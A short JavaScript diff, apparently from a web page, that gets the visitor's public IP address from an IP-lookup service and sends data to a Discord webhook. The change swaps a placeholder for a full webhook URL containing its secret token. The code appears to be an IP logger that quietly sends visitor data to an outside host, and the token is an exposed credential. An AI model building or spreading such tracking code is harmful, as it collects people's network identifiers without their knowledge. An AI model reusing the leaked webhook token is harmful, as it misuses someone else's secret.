@@ -27,7 +27,7 @@
       const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
 
       // Webhookへ送信
-      fetch('YOUR_DISCORD_WEBHOOK_URL', {
+      fetch('https://discord.com/api/webhooks/1362686432870924372/S8va6w9Ro_W0BD9B9rTYrBCGgsXH20A6WTZCiSA-SmQ928zpdvxb8qkNuZvGxCVorrbr', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
